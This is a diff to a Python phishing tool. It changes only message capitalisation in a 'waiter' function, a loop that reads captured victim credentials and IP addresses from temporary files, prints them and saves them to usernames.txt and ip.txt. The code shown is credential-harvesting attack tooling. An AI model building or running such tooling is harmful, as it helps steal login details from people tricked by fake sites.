@@ -634,11 +634,11 @@ def url_manager(url,num1,num2):
 
 # Last function capturing credentials
 def waiter():
-    sprint("\n"+info+blue+"Waiting for login info...."+cyan+"Press "+red+"Ctrl+C"+cyan+" to exit")
+    sprint("\n"+info+blue+"Waiting for Next Login Info...."+cyan+"Press "+red+"Ctrl+C"+cyan+" to exit")
     try:
         while True:
             if os.path.isfile(root+"/.site/usernames.txt"):
-                print("\n\n"+success+bgreen+"Victim login info found!\n\007")
+                print("\n\n"+success+bgreen+"Victim Login Info Found!\n\007")
                 with open(root+"/.site/usernames.txt","r") as ufile:
                     userdata=ufile.readlines()
                     j=0
@@ -647,14 +647,14 @@ def waiter():
                         print(cyan+'['+green+'*'+cyan+'] '+yellow+userdata[j],end="")
                         j+=1
                 print("\n"+info+"Saved in usernames.txt")
-                print("\n"+info+blue+"Waiting for next....."+cyan+"Press "+red+"Ctrl+C"+cyan+" to exit")
+                print("\n"+info+blue+"Waiting for Next Login Info....."+cyan+"Press "+red+"Ctrl+C"+cyan+" to exit")
                 system("cat $HOME/.site/usernames.txt >> usernames.txt")
                 os.remove(root+"/.site/usernames.txt")
             sleep(0.75)
             if os.path.isfile(root+"/.site/ip.txt"):
                 os.system("clear")
                 print(logo)
-                print("\n\n"+success+bgreen+"Victim IP found!\n\007")
+                print("\n\n"+success+bgreen+"Victim IP Found!\n\007")
                 with open(root+"/.site/ip.txt","r") as ipfile:
                     ipdata=ipfile.readlines()
                     h=0
@@ -663,7 +663,7 @@ def waiter():
                         print(cyan+'['+green+'*'+cyan+'] '+yellow+ipdata[h], end="")
                         h+=1
                 print("\n"+info+"Saved in ip.txt")
-                print("\n"+info+blue+"Waiting for next...."+cyan+"Press "+red+"Ctrl+C"+cyan+" to exit")
+                print("\n"+info+blue+"Waiting for Next Login Info...."+cyan+"Press "+red+"Ctrl+C"+cyan+" to exit")
                 system("cat $HOME/.site/ip.txt >> ip.txt")
                 os.system("rm -rf $HOME/.site/ip.txt")
             sleep(0.75)
